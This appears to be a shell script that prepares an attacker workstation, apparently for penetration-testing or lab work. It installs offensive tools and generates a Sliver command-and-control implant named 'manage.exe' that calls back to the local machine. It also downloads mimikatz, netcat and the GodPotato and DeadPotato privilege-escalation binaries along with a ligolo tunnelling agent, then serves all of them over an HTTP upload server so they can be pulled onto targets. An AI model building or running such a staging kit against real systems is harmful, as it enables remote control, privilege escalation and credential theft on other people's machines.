cd ~ 
sudo apt update 
sudo apt autoremove -y 
sudo apt clean 
sudo apt install remmina -y 
sudo apt autoremove -y 
sudo apt clean 
sudo apt install sliver -y 
lhost0=$(hostname -I | cut -f1 -d' ') 
echo "generate -m $lhost0 -N manage" |sudo sliver-server 
mv manage.exe ~/Documents/manage.exe 
sudo apt autoremove -y 
sudo apt clean 
sudo apt install autorecon -y 
sudo apt autoremove -y 
sudo apt clean 
sudo apt full-upgrade -y 
sudo apt autoremove -y 
sudo apt clean 
sudo apt install chisel -y 
sudo apt autoremove -y 
sudo apt clean 
sudo apt install zaproxy -y 
sudo apt autoremove -y 
sudo apt clean 
sudo apt install ligolo-ng -y 
sudo apt autoremove -y 
sudo apt clean

sudo ip tuntap add user kali mode tun ligolo 
sudo ip link set ligolo up 
sudo ip route add 240.0.0.1/32 dev ligolo 
sudo apt install toilet -y 
sudo apt autoremove -y 
sudo apt clean

wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O Documents/gp.exe 
wget https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe -O Documents/mz.exe 
wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe -O Documents/nc.exe 
wget https://github.com/lypd0/DeadPotato/releases/download/v1.2/DeadPotato-NET4.exe -O Documents/dp.exe

curl https://raw.githubusercontent.com/Tallguy297/SimpleHTTPServerWithUpload/refs/heads/master/SimpleHTTPServerWithUpload.py > Documents/shs 
chmod +x Documents/shs

pipx install uv 
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_windows_amd64.zip -O Documents/la.zip 
unzip Documents/la.zip -d Documents 
toilet -f mono12 -F metal "Installation is finished" 
cd Documents

sudo ./shs 9999